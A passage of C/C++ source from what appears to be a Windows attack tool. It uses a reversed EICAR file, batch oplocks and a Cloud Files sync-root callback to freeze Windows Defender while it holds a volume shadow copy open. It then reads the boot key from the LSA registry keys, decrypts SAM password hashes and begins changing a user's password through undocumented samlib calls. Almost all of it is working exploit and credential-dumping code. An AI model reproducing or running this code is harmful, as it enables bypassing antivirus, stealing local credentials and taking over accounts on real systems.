	LOG_OK("FREEZEVSS", "Lock file created: %ws, handle=0x%p", lockfile, (void*)hlock);


	//CreateDirectory(syncroot, NULL);
	LOG_INFO("FREEZEVSS", "Registering sync root: %ws (provider=%ws)", syncroot, cfreg.ProviderName);
	hs = CfRegisterSyncRoot(syncroot, &cfreg, &syncpolicy, CF_REGISTER_FLAG_NONE);
	if (hs)
	{
		LOG_ERR("FREEZEVSS", "CfRegisterSyncRoot(%ws) failed: hr=0x%08X", syncroot, (unsigned)hs);
		retval = ERROR_UNIDENTIFIED_ERROR;
		goto cleanup;
	}
	LOG_OK("FREEZEVSS", "Sync root registered: %ws", syncroot);
	syncrootregistered = true;
	hs = CfConnectSyncRoot(syncroot, callbackreg, &callbackctx, CF_CONNECT_FLAG_REQUIRE_PROCESS_INFO | CF_CONNECT_FLAG_REQUIRE_FULL_FILE_PATH, &cfkey);
	if (hs)
	{
		LOG_ERR("FREEZEVSS", "CfConnectSyncRoot(%ws) failed: hr=0x%08X", syncroot, (unsigned)hs);
		retval = ERROR_UNIDENTIFIED_ERROR;
		goto cleanup;
	}
	LOG_OK("FREEZEVSS", "Sync root connected, cfkey=0x%llX", cfkey.Internal);
	if (args->hlock) {
		CloseHandle(args->hlock);
		args->hlock = NULL;
	}

	LOG_INFO("FREEZEVSS", "Waiting for WD to access placeholder directory (hnotifywdaccess)...");

	WaitForSingleObject(callbackctx.hnotifywdaccess, INFINITE);
	LOG_OK("FREEZEVSS", "WD accessed the placeholder - proceeding to oplock lock file");

	ovd.hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
	if (!ovd.hEvent)
	{
		LOG_ERR("FREEZEVSS", "CreateEvent for oplock overlapped failed");
		retval = GetLastError();
		goto cleanup;
	}
	SetLastError(ERROR_SUCCESS);
	LOG_INFO("FREEZEVSS", "Requesting FSCTL_REQUEST_BATCH_OPLOCK on lock file...");
	DeviceIoControl(hlock, FSCTL_REQUEST_BATCH_OPLOCK, NULL, NULL, NULL, NULL, NULL, &ovd);

	if (GetLastError() != ERROR_IO_PENDING)
	{
		LOG_ERR("FREEZEVSS", "FSCTL_REQUEST_BATCH_OPLOCK on lock file failed (not IO_PENDING)");
		retval = GetLastError();
		goto cleanup;
	}
	LOG_OK("FREEZEVSS", "Oplock request pending on lock file");
	SetEvent(callbackctx.hnotifylockcreated);
	LOG_INFO("FREEZEVSS", "hnotifylockcreated signaled - CfExecute will now proceed in callback");

	LOG_INFO("FREEZEVSS", "Waiting for oplock to be broken (WD opening lock file => WD frozen)...");

	GetOverlappedResult(hlock, &ovd, &nwf, TRUE);

	LOG_OK("FREEZEVSS", "Oplock broken - WD thread is now frozen, VSS is accessible");

	SetEvent(args->hvssready);

	WaitForSingleObject(args->hcleanupevent, INFINITE);

	
	
cleanup:

	if (hlock)
		CloseHandle(hlock);
	if (callbackctx.hnotifylockcreated)
		CloseHandle(callbackctx.hnotifylockcreated);
	if (callbackctx.hnotifywdaccess)
		CloseHandle(callbackctx.hnotifywdaccess);
	if (ovd.hEvent)
		CloseHandle(ovd.hEvent);

	if (syncrootregistered)
	{
		CfDisconnectSyncRoot(cfkey);
		CfUnregisterSyncRoot(syncroot);
	}
	

	return retval;

}


bool TriggerWDForVS(HANDLE hreleaseevent,wchar_t* fullvsspath)
{
	GUID uid = { 0 };
	RPC_WSTR wuid = { 0 };
	UuidCreate(&uid);
	UuidToStringW(&uid, &wuid);
	wchar_t* wuid2 = (wchar_t*)wuid;

	wchar_t workdir[MAX_PATH] = { 0 };
	ExpandEnvironmentStrings(L"%TEMP%\\", workdir, MAX_PATH);
	wcscat(workdir, wuid2);
	wchar_t eicarfilepath[MAX_PATH] = { 0 };
	wcscpy(eicarfilepath,workdir);
	wcscat(eicarfilepath,L"\\foo.exe");

	HANDLE hlock = NULL;
	wchar_t rstmgr[MAX_PATH] = { 0 };
	ExpandEnvironmentStrings(L"%windir%\\System32\\RstrtMgr.dll", rstmgr, MAX_PATH);
	OVERLAPPED ovd = { 0 };
	char eicar[] = "*H+H$!ELIF-TSET-SURIVITNA-DRADNATS-RACIE$}7)CC7)^P(45XZP\\4[PA@%P!O5X";
	rev(eicar);
	DWORD nwf = 0;
	cloudworkerthreadargs cldthreadargs = { 0 };
	DWORD tid = 0;
	HANDLE hthread = NULL;
	bool dircreated = false;
	bool retval = true;
	HANDLE hfile = NULL;
	HANDLE trigger = NULL;
	HANDLE hthread2 = NULL;
	HANDLE hobj[2] = { 0 };
	DWORD exitcode = STATUS_SUCCESS;
	DWORD waitres = 0;
	LOG_INFO("VSS", "Creating ShadowCopyFinder thread...");
	hthread = CreateThread(NULL, NULL, ShadowCopyFinderThread, (void*)fullvsspath, NULL, &tid);
	if (!hthread)
	{
		LOG_ERR("VSS", "CreateThread(ShadowCopyFinderThread) failed");
		retval = false;
		goto cleanup;
	}
	LOG_OK("VSS", "ShadowCopyFinder thread created, TID=%d", tid);

	LOG_INFO("VSS", "Creating work directory: %ws", workdir);
	dircreated = CreateDirectory(workdir, NULL);
	if (!dircreated)
	{
		LOG_ERR("VSS", "CreateDirectory(%ws) failed", workdir);
		retval = false;
		goto cleanup;
	}

	LOG_INFO("VSS", "Creating EICAR trigger file: %ws", eicarfilepath);
	hfile = CreateFile(eicarfilepath, GENERIC_READ | GENERIC_WRITE | DELETE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_DELETE_ON_CLOSE, NULL);
	if (!hfile || hfile == INVALID_HANDLE_VALUE)
	{
		LOG_ERR("VSS", "CreateFile(EICAR) failed - check write permissions to %%TEMP%%");
		retval = false;
		goto cleanup;
	}
	LOG_OK("VSS", "EICAR file created");


	
	if (!WriteFile(hfile, eicar, sizeof(eicar) - 1, &nwf, NULL))
	{
		LOG_ERR("VSS", "WriteFile(EICAR) failed");
		retval = false;
		goto cleanup;
	}
	LOG_OK("VSS", "EICAR content written (%d bytes)", sizeof(eicar) - 1);


	LOG_INFO("VSS", "Opening RstrtMgr.dll for exclusive oplock: %ws", rstmgr);
	hlock = CreateFile(rstmgr, GENERIC_READ | SYNCHRONIZE, NULL, NULL, OPEN_EXISTING, FILE_FLAG_OVERLAPPED, NULL);
	if (!hlock || hlock == INVALID_HANDLE_VALUE)
	{
		LOG_ERR("ACCESS", "CreateFile(RstrtMgr.dll) failed - file may be locked by another process");
		retval = false;
		goto cleanup;
	}
	LOG_OK("VSS", "RstrtMgr.dll opened exclusively, handle=0x%p", (void*)hlock);


	ovd.hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
	if (!ovd.hEvent)
	{
		LOG_ERR("VSS", "CreateEvent for oplock overlapped failed");
		retval = false;
		goto cleanup;
	}

	SetLastError(ERROR_SUCCESS);
	LOG_INFO("VSS", "Requesting FSCTL_REQUEST_BATCH_OPLOCK on RstrtMgr.dll...");
	DeviceIoControl(hlock, FSCTL_REQUEST_BATCH_OPLOCK, NULL, NULL, NULL, NULL, NULL, &ovd);

	if (GetLastError() != ERROR_IO_PENDING)
	{
		LOG_ERR("ACCESS", "FSCTL_REQUEST_BATCH_OPLOCK failed (not IO_PENDING)");
		retval = false;
		goto cleanup;
	}
	LOG_OK("VSS", "Oplock request pending on RstrtMgr.dll");

	LOG_INFO("VSS", "Triggering WD by opening EICAR file...");
	trigger = CreateFile(eicarfilepath, GENERIC_READ, FILE_SHARE_READ|FILE_SHARE_WRITE|FILE_SHARE_DELETE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (trigger && trigger != INVALID_HANDLE_VALUE)
		CloseHandle(trigger);

	LOG_INFO("VSS", "Waiting for RstrtMgr oplock to trigger...");
	GetOverlappedResult(hlock, &ovd, &nwf, TRUE);
	LOG_OK("VSS", "Oplock triggered - WD is processing the EICAR file");

	LOG_INFO("VSS", "Waiting for ShadowCopyFinder thread to complete (timeout=120s)...");
	{
		DWORD waitResult = WaitForSingleObject(hthread, 120000);
		if (waitResult == WAIT_TIMEOUT) {
			LOG_ERR("VSS", "ShadowCopyFinder thread timed out after 120s - VSS was not created by WD");
			retval = false;
			goto cleanup;
		}
		if (waitResult != WAIT_OBJECT_0) {
			LOG_ERR("VSS", "WaitForSingleObject returned unexpected value: %d, GetLastError=%d", waitResult, GetLastError());
			retval = false;
			goto cleanup;
		}
	}

	if (!GetExitCodeThread(hthread, &exitcode))
	{
		LOG_ERR("VSS", "GetExitCodeThread failed");
		retval = false;
		goto cleanup;
	}
	LOG_INFO("VSS", "ShadowCopyFinder thread exited with code=%d (0x%08X)", exitcode, exitcode);
	if (exitcode == STILL_ACTIVE)
	{
		LOG_ERR("VSS", "Thread reports STILL_ACTIVE (259) - this should not happen after WaitForSingleObject");
		retval = false;
		goto cleanup;
	}
	if (exitcode != ERROR_SUCCESS)
	{
		char eb[512]; WinErrToStr(exitcode, eb, sizeof(eb));
		LOG_ERR("VSS", "ShadowCopyFinder thread failed: error=%d (0x%08X) \"%s\"", exitcode, exitcode, eb);
		retval = false;
		goto cleanup;
	}
	LOG_OK("VSS", "ShadowCopyFinder thread completed successfully");


	cldthreadargs.hcleanupevent = hreleaseevent;
	cldthreadargs.hlock = hlock;
	cldthreadargs.hvssready = CreateEvent(NULL, FALSE, FALSE, NULL);

	LOG_INFO("VSS", "Creating FreezeVSS thread...");
	hthread2 = CreateThread(NULL, NULL, FreezeVSS, &cldthreadargs, NULL, &tid);
	if (!hthread2) {
		LOG_ERR("VSS", "CreateThread(FreezeVSS) failed");
		retval = false;
		goto cleanup;
	}
	LOG_OK("VSS", "FreezeVSS thread created, TID=%d", tid);



	hobj[0] = hthread2;
	hobj[1] = cldthreadargs.hvssready;
	LOG_INFO("VSS", "Waiting for FreezeVSS thread (hvssready event or thread exit)...");
	waitres = WaitForMultipleObjects(2, hobj, FALSE, INFINITE);

	if (waitres - WAIT_OBJECT_0 == 0)
	{
		LOG_ERR("VSS", "FreezeVSS thread exited prematurely (waitres=WAIT_OBJECT_0+0), WD freeze failed");
		retval = false;
	}
	else {
		LOG_OK("VSS", "FreezeVSS ready event signaled - WD is frozen");
	}

cleanup:


	if (hthread)
		CloseHandle(hthread);
	if(hthread2)
		CloseHandle(hthread2);
	if(cldthreadargs.hvssready)
		CloseHandle(cldthreadargs.hvssready);
	if (ovd.hEvent)
		CloseHandle(ovd.hEvent);
	if (hfile)
		CloseHandle(hfile);
	if (dircreated)
		RemoveDirectory(workdir);

	return retval;



}
//////////////////////////////////////////////////////////////////////
// Volume shadow copy functions end
/////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////
// SAM handling start
/////////////////////////////////////////////////////////////////////


#define SAM_DATABASE_DATA_ACCESS_OFFSET 0xcc
#define SAM_DATABASE_USERNAME_OFFSET 0x0c
#define SAM_DATABASE_USERNAME_LENGTH_OFFSET 0x10
#define SAM_DATABASE_LM_HASH_OFFSET 0x9c
#define SAM_DATABASE_LM_HASH_LENGTH_OFFSET 0xa0
#define SAM_DATABASE_NT_HASH_OFFSET 0xa8
#define SAM_DATABASE_NT_HASH_LENGTH_OFFSET 0xac

struct PwdEnc
{
	char* buff;
	size_t sz;
	wchar_t* username;
	ULONG usernamesz;
	char* LMHash;
	ULONG LMHashLenght;
	char* NTHash;
	ULONG NTHashLenght;
	ULONG rid;

};


NTSTATUS WINAPI SamConnect(IN PUNICODE_STRING ServerName, OUT HANDLE* ServerHandle, IN ACCESS_MASK DesiredAccess, IN BOOLEAN Trusted);
NTSTATUS WINAPI SamCloseHandle(IN HANDLE SamHandle);
NTSTATUS WINAPI SamOpenDomain(IN HANDLE SamHandle, IN ACCESS_MASK DesiredAccess, IN PSID DomainId, OUT HANDLE* DomainHandle);
NTSTATUS WINAPI SamOpenUser(IN HANDLE DomainHandle, IN ACCESS_MASK DesiredAccess, IN DWORD UserId, OUT HANDLE* UserHandle);
NTSTATUS WINAPI SamiChangePasswordUser(IN HANDLE UserHandle, IN BOOL isOldLM, IN const BYTE* oldLM, IN const BYTE* newLM, IN BOOL isNewNTLM, IN const BYTE* oldNTLM, IN const BYTE* newNTLM);



void hex_string_to_bytes(const char* hex_string, unsigned char* byte_array, size_t max_len) {
	size_t len = strlen(hex_string);
	if (len % 2 != 0) {
		fprintf(stderr, "Error: Hex string length must be even.\n");
		return;
	}

	size_t byte_len = len / 2;
	if (byte_len > max_len) {
		fprintf(stderr, "Error: Output buffer too small.\n");
		return;
	}

	for (size_t i = 0; i < byte_len; i++) {
		// Read two hex characters and convert them to an unsigned int
		unsigned int byte_val;
		if (sscanf(&hex_string[i * 2], "%2x", &byte_val) != 1) {
			fprintf(stderr, "Error: Invalid hex character in string.\n");
			return;
		}
		byte_array[i] = (unsigned char)byte_val;
	}
}

bool GetLSASecretKey(unsigned char bootkeybytes[16])
{

	const wchar_t* keynames[] = { {L"JD"}, {L"Skew1"}, {L"GBG"}, {L"Data"} };
	int indices[] = { 8, 5, 4, 2, 11, 9, 13, 3, 0, 6, 1, 12, 14, 10, 15, 7 };


	//ORHKEY hlsa = NULL;
	HKEY hlsa = NULL;
	DWORD err = RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"SYSTEM\\CurrentControlSet\\Control\\Lsa", NULL, KEY_READ, &hlsa);
	char data[0x1000] = { 0 };
	DWORD index = 0;
	for (const wchar_t* keyname : keynames)
	{
		DWORD retsz = sizeof(data) / sizeof(char);
		HKEY hbootkey = NULL;
		err = RegOpenKeyEx(hlsa, keyname, NULL, KEY_QUERY_VALUE, &hbootkey);

		err = RegQueryInfoKeyA(hbootkey, &data[index], &retsz, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
		index += retsz;
		RegCloseKey(hbootkey);
	}
	//printf("%s\n", data);
	RegCloseKey(hlsa);

	if (strlen(data) < 16)
	{
		LOG_ERR("BOOTKEY", "Boot key mismatch: hex string length=%d (expected >=16), data='%s'", (int)strlen(data), data);
		return 1;
	}

	// convert hex string to binary
	unsigned char keybytes[16] = { 0 };
	hex_string_to_bytes(data, keybytes, 16);



	for (int i = 0; i < sizeof(keybytes); i++)
	{

		bootkeybytes[i] = keybytes[indices[i]];
	}
	return true;

}

void* UnprotectAES(char* lsaKey, char* iv, char* hashdata, unsigned long enclen, int* decryptedlen)
{

	char* decrypted = (char*)malloc(enclen);
	memmove(decrypted, hashdata, enclen);
	HCRYPTPROV hprov = NULL;

	CryptAcquireContext(&hprov, 0, L"Microsoft Enhanced RSA and AES Cryptographic Provider", PROV_RSA_AES, CRYPT_VERIFYCONTEXT);

	struct aes128keyBlob
	{
		BLOBHEADER hdr;
		DWORD keySize;
		BYTE bytes[16];
	} blob;

	blob.hdr.bType = PLAINTEXTKEYBLOB;
	blob.hdr.bVersion = CUR_BLOB_VERSION;
	blob.hdr.reserved = 0;
	blob.hdr.aiKeyAlg = CALG_AES_128;
	blob.keySize = 16;
	memmove(blob.bytes, lsaKey, 16);
	HCRYPTKEY hcryptkey = NULL;
	CryptImportKey(hprov, (const BYTE*)&blob, sizeof(aes128keyBlob), NULL, NULL, &hcryptkey);

	DWORD mode = CRYPT_MODE_CBC;
	CryptSetKeyParam(hcryptkey, KP_IV, (const BYTE*)iv, NULL);
	
	CryptSetKeyParam(hcryptkey, KP_MODE, (const BYTE*)&mode, NULL);

	DWORD retsz = enclen;

	CryptDecrypt(hcryptkey, NULL, TRUE, CRYPT_DECRYPT_RSA_NO_PADDING_CHECK, (BYTE*)decrypted, &retsz);
	

	/*
	EVP_CIPHER_CTX* en = EVP_CIPHER_CTX_new();

	int fulllen = 0;
	int retval = EVP_DecryptInit(en, EVP_aes_128_cbc(), (const unsigned char*)lsaKey, (const unsigned char*)iv);
	if (!retval)
		return NULL;

	//int decryptedsz = enclen;
	retval = EVP_DecryptUpdate(en, (unsigned char*)decrypted, (int*)&enclen, (const unsigned char*)hashdata, enclen);
	if (!retval)
		return NULL;
	retval = EVP_DecryptFinal_ex(en, (unsigned char*)decrypted + enclen, &fulllen);
	EVP_CIPHER_CTX_free(en);
	if (!retval)
		return NULL;
	*/
	if (decryptedlen)
		*decryptedlen = retsz;

	return decrypted;

}

#ifndef SHA256_DIGEST_LENGTH
#define SHA256_DIGEST_LENGTH 32
#endif

bool ComputeSHA256(char* data, int size, char hashout[SHA256_DIGEST_LENGTH])
{


	char* data2 = (char*)malloc(SHA256_DIGEST_LENGTH);
	ZeroMemory(data2, SHA256_DIGEST_LENGTH);
	HCRYPTPROV hprov = NULL;
	CryptAcquireContext(&hprov, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT);
	HCRYPTHASH Hhash = NULL;
	CryptCreateHash(hprov, CALG_SHA_256, NULL, NULL, &Hhash);
	CryptHashData(Hhash, (const BYTE*)data, size, NULL);
	DWORD md_len = 0;
	DWORD inputsz = sizeof(md_len);
	CryptGetHashParam(Hhash, HP_HASHSIZE, (BYTE*)&md_len, &inputsz, NULL);
	//inputsz = size;
	CryptGetHashParam(Hhash, HP_HASHVAL, (BYTE*)hashout, &md_len, NULL);

	CryptDestroyHash(Hhash);
	CryptReleaseContext(hprov, NULL);
	/*
	EVP_MD_CTX* en = EVP_MD_CTX_new();

	bool retval = EVP_DigestInit(en, EVP_sha256());
	if (!retval)
		return retval;
	retval = EVP_DigestUpdate(en, data, size);
	if (!retval)
		return retval;
	EVP_DigestFinal(en, (unsigned char*)hashout, NULL);
	*/
	//return retval;
	return true;



}

void* UnprotectPasswordEncryptionKeyAES(char* data, char* lsaKey, int* keysz)
{

	int hashlen = data[0];
	int enclen = data[4];

	char iv[16] = { 0 };
	memmove(iv, &data[8], sizeof(iv));

	char* cyphertext = (char*)malloc(enclen);
	memmove(cyphertext, &data[0x18], enclen);

	// first arg, lsaKey | second arg, iv | thid arg, ciphertext
	int outsz = 0;
	int pekoutsz = 0;
	char* pek = (char*)UnprotectAES(lsaKey, iv, cyphertext, enclen, &pekoutsz);

	char* hashdata = (char*)malloc(hashlen);
	memmove(hashdata, &data[0x18 + enclen], hashlen);

	char* hash = (char*)UnprotectAES(lsaKey, iv, hashdata, hashlen, &outsz);


	char hash256[SHA256_DIGEST_LENGTH];

	if (!ComputeSHA256(pek, pekoutsz, hash256))
	{
		return NULL;
	}

	if (memcmp(hash256, hash, sizeof(hash256)) != 0)
	{
		LOG_ERR("CRYPTO", "AES password key validation failed: SHA256 mismatch (data corrupted or wrong LSA key?)");
		return NULL;
	}
	if (keysz)
		*keysz = sizeof(hash256);


	return pek;

}

void* UnprotectPasswordEncryptionKey(char* samKey, unsigned char* lsaKey, int* keysz)
{

	int enctype = samKey[0x68];
	if (enctype == 2) {
		int endofs = samKey[0x6c] + 0x68;
		int len = endofs - 0x70;

		char* data = (char*)malloc(len);
		memmove(data, &samKey[0x70], len);
		void* retval = UnprotectPasswordEncryptionKeyAES(data, (char*)lsaKey, keysz);

		return retval;
	}
	__debugbreak();
	return NULL;

}

void* UnprotectPasswordHashAES(char* key, int keysz, char* data, int datasz, int* outsz)
{
	int length = data[4];
	if (!length)
		return NULL;
	char iv[16] = { 0 };
	memmove(iv, &data[8], sizeof(iv));

	int ciphertextsz = datasz - 24;
	char* ciphertext = (char*)malloc(ciphertextsz);
	memmove(ciphertext, &data[8 + sizeof(iv)], ciphertextsz);
	return UnprotectAES(key, iv, ciphertext, ciphertextsz, outsz);
}

void* UnprotectPasswordHash(char* key, int keysz, char* data, int datasz, ULONG rid, int* outsz)
{
	int enctype = data[2];

	switch (enctype)
	{
	case 2:

		return UnprotectPasswordHashAES(key, keysz, data, datasz, outsz);

		break;
	default:
		__debugbreak();
		break;
	}

	return NULL;


}

void* UnprotectDES(char* key, int keysz, char* ciphertext, int ciphertextsz, int* outsz)
{
	
	char* ciphertext2 = (char*)malloc(ciphertextsz);
	memmove(ciphertext2, ciphertext, ciphertextsz);
	HCRYPTPROV hprov = NULL;
	CryptAcquireContext(&hprov, 0, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT);

	struct deskeyBlob
	{
		BLOBHEADER hdr;
		DWORD keySize;
		BYTE bytes[8];
	}blob;
	//deskeyBlob* blob = (deskeyBlob*)malloc(sizeof(deskeyBlob) + keysz);
	blob.hdr.bType = PLAINTEXTKEYBLOB;
	blob.hdr.bVersion = CUR_BLOB_VERSION;
	blob.hdr.reserved = 0;
	blob.hdr.aiKeyAlg = CALG_DES;
	blob.keySize = 8;
	memmove(blob.bytes, key, 8);
	HCRYPTKEY hcryptkey = NULL;
	CryptImportKey(hprov, (const BYTE*)&blob, sizeof(deskeyBlob), NULL, NULL, &hcryptkey);

	DWORD mode = CRYPT_MODE_ECB;
	CryptSetKeyParam(hcryptkey, KP_MODE, (const BYTE*)&mode, NULL);

	DWORD retsz = ciphertextsz;

	CryptDecrypt(hcryptkey, NULL, TRUE, CRYPT_DECRYPT_RSA_NO_PADDING_CHECK, (BYTE*)ciphertext2, &retsz);

	if (outsz)
		*outsz = 8;

	//printf("GetLastError : %x\n", GetLastError());
	CryptReleaseContext(hprov, NULL);
	return ciphertext2;

	/*
	DWORD mode = CRYPT_MODE_ECB;
	CryptSetKeyParam(hcryptkey, KP_MODE, (const BYTE*)&mode, NULL);
	printf("GetLastError : %x\n", GetLastError());

	DWORD retsz = enclen;

	CryptDecrypt(hcryptkey, NULL, TRUE, CRYPT_DECRYPT_RSA_NO_PADDING_CHECK, (BYTE*)decrypted, &retsz);
	printf("GetLastError : %x\n", GetLastError());
	*/
	/*
	OSSL_PROVIDER* legacy = OSSL_PROVIDER_load(NULL, "legacy");
	if (legacy == NULL)
	{
		printf("Failed to load Legacy provider\n");
	}
	
	EVP_CIPHER_CTX* en = EVP_CIPHER_CTX_new();

	int fulllen = 0;
	int retval = EVP_DecryptInit_ex(en, EVP_des_ecb(), NULL, (const unsigned char*)key, NULL);

	char* plaintext = (char*)malloc(ciphertextsz);
	int _outsz = 0;
	retval = EVP_DecryptUpdate(en, (unsigned char*)plaintext, &_outsz, (const unsigned char*)ciphertext, ciphertextsz);
	int _outlen = 0;
	retval = EVP_DecryptFinal_ex(en, (unsigned char*)plaintext + _outsz, &_outlen);

	if (outsz)
		*outsz = _outsz;

	return plaintext;
	*/
}

char* DeriveDESKey(char data[7])
{


	union keyderv {
		struct {
			char arr[8];
		};
		SIZE_T derv;
	};
	keyderv ttv = { 0 };
	ZeroMemory(ttv.arr, sizeof(ttv.arr));
	memmove(ttv.arr, data, sizeof(data) - 1);
	SIZE_T k = ttv.derv;


	char* key = (char*)malloc(sizeof(data));

	for (int i = 0; i < 8; i++)
	{
		int j = 7 - i;
		int curr = (k >> (7 * j)) & 0x7F;
		int b = curr;
		b ^= b >> 4;
		b ^= b >> 2;
		b ^= b >> 1;
		int keybyte = (curr << 1) ^ (b & 1) ^ 1;
		key[i] = (char)keybyte;
	}
	return key;
}

void* UnproctectPasswordHashDES(char* ciphertext, int ciphersz, int* outsz, ULONG rid)
{

	union keydata {
		struct {
			char a;
			char b;
			char c;
			char d;
		};
		ULONG data;
	};

	keydata keycontent = { 0 };
	keycontent.data = rid;
	char key1[7] = { keycontent.c,keycontent.b,keycontent.a,keycontent.d, keycontent.c, keycontent.b,keycontent.a };
	char key2[7] = { keycontent.b,keycontent.a,keycontent.d,keycontent.c, keycontent.b, keycontent.a,keycontent.d };

	char* rkey1 = DeriveDESKey(key1);
	char* rkey2 = DeriveDESKey(key2);


	int plaintext1sz = 0;
	int plaintext2sz = 0;
	char* plaintext1 = (char*)UnprotectDES(rkey1, sizeof(key1), ciphertext, ciphersz, &plaintext1sz);
	if (!plaintext1)
		return NULL;
	char* plaintext2 = (char*)UnprotectDES(rkey2, sizeof(key2), &ciphertext[8], ciphersz, &plaintext2sz);
	if (!plaintext2)
		return NULL;
	void* retval = malloc(plaintext1sz + plaintext2sz);

	memmove(retval, plaintext1, plaintext1sz);
	memmove(RtlOffsetToPointer(retval, plaintext1sz), plaintext2, plaintext2sz);
	if (outsz)
		*outsz = plaintext1sz + plaintext2sz;
	return retval;
}

void* UnprotectNTHash(char* key, int keysz, char* encryptedHash, int enchashsz, int* outsz, ULONG rid)
{
	int _outsz = 0;
	void* dec = UnprotectPasswordHash(key, keysz, encryptedHash, enchashsz, rid, &_outsz);
	if (!dec)
		return NULL;
	int _hashoutsz = 0;
	void* _hash = UnproctectPasswordHashDES((char*)dec, _outsz, &_hashoutsz, rid);
	if (outsz)
		*outsz = _hashoutsz;
	return _hash;
}

unsigned char* HexToHexString(unsigned char* data, int size)
{
	unsigned char* retval = (unsigned char*)malloc(size * 2 + 1);
	ZeroMemory(retval, size + 1);
	for (int i = 0; i < size; i++)
	{
		sprintf((char*)&retval[i * 2], "%02x", data[i]);
	}

	return retval;
}


char* CalculateNTLMHash(char* _input)
{

	int pw_len = strlen(_input);
	char* input = new char[pw_len * 2];
	for (int i = 0; i < pw_len; i++)
	{
		input[i * 2] = _input[i];
		input[i * 2 + 1] = '\0';
	}

	
	unsigned int md_len = 0;

	HCRYPTPROV hprov = NULL;

	CryptAcquireContext(&hprov, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT);

	HCRYPTHASH Hhash = NULL;
	CryptCreateHash(hprov, CALG_MD4, NULL, NULL, &Hhash);

	CryptHashData(Hhash, (const BYTE*)input, pw_len * 2, NULL);

	DWORD inputsz = sizeof(md_len);
	CryptGetHashParam(Hhash, HP_HASHSIZE, (BYTE*)&md_len, &inputsz, NULL);
	unsigned char* md_value = (unsigned char*)malloc(md_len);
	inputsz = md_len;
	CryptGetHashParam(Hhash, HP_HASHVAL, (BYTE*)md_value, &inputsz, NULL);

	CryptDestroyHash(Hhash);
	CryptReleaseContext(hprov, NULL);
	/*
	EVP_MD_CTX* mdctx = EVP_MD_CTX_new();
	EVP_DigestInit_ex(mdctx, EVP_md4(), NULL);
	EVP_DigestUpdate(mdctx, input, pw_len * 2);
	EVP_DigestFinal_ex(mdctx, md_value, &md_len);
	EVP_MD_CTX_free(mdctx);
	*/
	/*
	printf("Digest is: ");
	for (int i = 0; i < md_len; i++)
		printf("%02x", md_value[i]);
	printf("\n");
	*/
	return (char*)md_value;

}
bool ChangeUserPassword(wchar_t* username, void* nthash, char* newpassword, char* newNTLMHash = NULL)
{

	wchar_t libpath[MAX_PATH] = { 0 };
	ExpandEnvironmentStrings(L"%windir%\\System32\\samlib.dll",libpath,MAX_PATH);

	LOG_INFO("SAM", "Loading samlib.dll from %ws", libpath);
	HMODULE hm = LoadLibrary(libpath);
	if (!hm)
	{
		LOG_ERR("SAM", "LoadLibrary(samlib.dll) failed");
		return false;
	}
	LOG_OK("SAM", "samlib.dll loaded at 0x%p", (void*)hm);
	NTSTATUS(WINAPI * _SamConnect)
		(IN PUNICODE_STRING ServerName, OUT HANDLE * ServerHandle, IN ACCESS_MASK DesiredAccess, IN BOOLEAN Trusted) = (NTSTATUS(WINAPI*)(IN PUNICODE_STRING ServerName, OUT HANDLE * ServerHandle, IN ACCESS_MASK DesiredAccess, IN BOOLEAN Trusted))GetProcAddress(hm, "SamConnect");
	NTSTATUS(WINAPI * _SamCloseHandle)(IN HANDLE SamHandle) = (NTSTATUS(WINAPI*)(IN HANDLE SamHandle))GetProcAddress(hm, "SamCloseHandle");
	NTSTATUS(WINAPI * _SamOpenDomain)(IN HANDLE SamHandle, IN ACCESS_MASK DesiredAccess, IN PSID DomainId, OUT HANDLE * DomainHandle)
		= (NTSTATUS(WINAPI*)(IN HANDLE SamHandle, IN ACCESS_MASK DesiredAccess, IN PSID DomainId, OUT HANDLE * DomainHandle))GetProcAddress(hm, "SamOpenDomain");
	NTSTATUS(WINAPI * _SamOpenUser)(IN HANDLE DomainHandle, IN ACCESS_MASK DesiredAccess, IN DWORD UserId, OUT HANDLE * UserHandle) = (NTSTATUS(WINAPI*)(IN HANDLE DomainHandle, IN ACCESS_MASK DesiredAccess, IN DWORD UserId, OUT HANDLE * UserHandle))GetProcAddress(hm, "SamOpenUser");
	NTSTATUS(WINAPI * _SamiChangePasswordUser)(IN HANDLE UserHandle, IN BOOL isOldLM, IN const BYTE * oldLM, IN const BYTE * newLM, IN BOOL isNewNTLM, IN const BYTE * oldNTLM, IN const BYTE * newNTLM) = (NTSTATUS(WINAPI*)(IN HANDLE UserHandle, IN BOOL isOldLM, IN const BYTE * oldLM, IN const BYTE * newLM, IN BOOL isNewNTLM, IN const BYTE * oldNTLM, IN const BYTE * newNTLM))GetProcAddress(hm, "SamiChangePasswordUser");


	if (!_SamConnect || !_SamCloseHandle || !_SamOpenDomain || !_SamOpenUser || !_SamiChangePasswordUser)
	{
		LOG_ERR("SAM", "Failed to resolve one or more exports from samlib.dll: SamConnect=%p SamCloseHandle=%p SamOpenDomain=%p SamOpenUser=%p SamiChangePasswordUser=%p",
			(void*)_SamConnect, (void*)_SamCloseHandle, (void*)_SamOpenDomain, (void*)_SamOpenUser, (void*)_SamiChangePasswordUser);
		return false;
	}
	LOG_OK("SAM", "All samlib exports resolved");

	HANDLE hsrv = NULL;
	LOG_INFO("SAM", "Connecting to local SAM (MAXIMUM_ALLOWED)...");
	NTSTATUS stat = _SamConnect(NULL, &hsrv, MAXIMUM_ALLOWED, false);
	if (stat)
	{
		LOG_NT("SAM", stat, "SamConnect failed");
		return false;
	}
	LOG_OK("SAM", "Connected to SAM, handle=0x%p", (void*)hsrv);
	LOG_INFO("SAM", "Opening LSA policy (MAXIMUM_ALLOWED)...");
	LSA_OBJECT_ATTRIBUTES loa = { 0 };
	LSA_HANDLE hlsa = NULL;
	stat = LsaOpenPolicy(NULL, &loa, MAXIMUM_ALLOWED, &hlsa);
	if (stat)
	{
		LOG_NT("ACCESS", stat, "LsaOpenPolicy failed - insufficient privileges?");
		return false;
	}
	LOG_OK("SAM", "LSA policy opened");

	LOG_INFO("SAM", "Querying domain info...");
